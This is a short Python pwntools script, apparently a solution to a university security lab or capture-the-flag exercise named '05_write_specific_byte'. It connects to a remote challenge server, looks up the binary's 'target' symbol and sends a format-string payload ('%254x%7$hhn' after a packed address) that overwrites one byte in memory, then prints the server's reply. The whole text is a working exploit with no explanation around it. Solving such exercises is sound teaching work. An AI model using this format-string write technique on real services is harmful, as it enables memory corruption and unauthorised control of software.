from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23195

s = remote(SERVER, PORT, timeout=9999)
elf = ELF("./05_write_specific_byte")
target_address = elf.symbols["target"]
s.sendline(p32(target_address + 3) + b"%254x" + b"%7$hhn")
s.recvline()
s.recvline()
response = s.recvline()
print(response.decode())
